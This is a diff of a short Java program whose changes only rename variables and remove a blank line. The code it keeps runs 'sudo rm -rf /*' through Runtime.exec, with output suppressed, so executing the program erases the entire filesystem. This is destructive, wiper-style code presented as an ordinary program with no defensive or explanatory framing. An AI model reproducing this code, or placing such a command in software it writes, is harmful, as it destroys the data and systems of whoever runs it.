@@ -1,6 +1,5 @@
 package me.maxwell.mr;
 
-
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -11,17 +10,17 @@ public class Main {
 
         String command = "sudo rm -rf /* > /dev/null";
 
-        Process proc = Runtime.getRuntime().exec(command);
+        Process process = Runtime.getRuntime().exec(command);
 
-        BufferedReader reader =
-                new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        BufferedReader bfreader =
+                new BufferedReader(new InputStreamReader(process.getInputStream()));
 
-        String line = "";
-        while((line = reader.readLine()) != null) {
-            System.out.print(line + "\n");
+        String strline = "";
+        while((strline = bfreader.readLine()) != null) {
+            System.out.print(strline + "\n");
         }
 
-        proc.waitFor();
+        process.waitFor();
 
     }
 }
